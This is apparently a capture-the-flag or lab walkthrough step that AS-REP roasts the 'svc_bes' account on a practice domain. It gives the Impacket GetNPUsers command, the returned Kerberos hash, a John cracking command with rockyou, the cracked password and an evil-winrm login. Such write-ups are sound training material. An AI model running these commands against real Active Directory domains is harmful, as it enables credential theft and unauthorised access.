It’s worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to ASREPRoasting. We can check this using a tool such as Impacket’s GetNPUsers. 

`/tmp/impacket/examples`

`GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30`


```
python3 GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
Impacket v0.9.24.dev1+20210917.161743.0297480b - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for svc_bes
$krb5asrep$23$svc_bes@MEGACORP.LOCAL:c0aaaeb7928bf9b22eaeea2223e0b27d$38095cd756a81f80c537ab9433fd385f8e34a4edffc1b3a0ce56ee4893cf3245a1180f8d6a9ce0e373bf4e34caea664b5cf59604461a7d4460327b589bcc22b3ea228bca822348cb412034831d3b13796f58be0f74aa08d10742177297880a92a9c279d5acf6c43678fdd110bef4808dea64de81dacce883434b8315327a45a77ced2c61f8a1c2c73b2fed229b859bfff0e9df56bf210f70a7e8b4c7be41d1d07b5ecd3def166be24b1f44b8b55ef6943e6611b6ac86e1584cfe888d9426b7e359227ce490abcd43db7e9b6b0fcb03ab72c4b1aa60857015895bebcd84171560fd1b6935faacdc5be736d387e12d62e6d
```

Once you have the TGT ticket, you can crack it using John

`john tgt_hash -wordlist=/usr/share/wordlists/rockyou.txt`

This gives you `Sheffield19`

`svc_bes:Sheffield19`

We can now user WinRM to access the machine and get user.txt
`evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19`
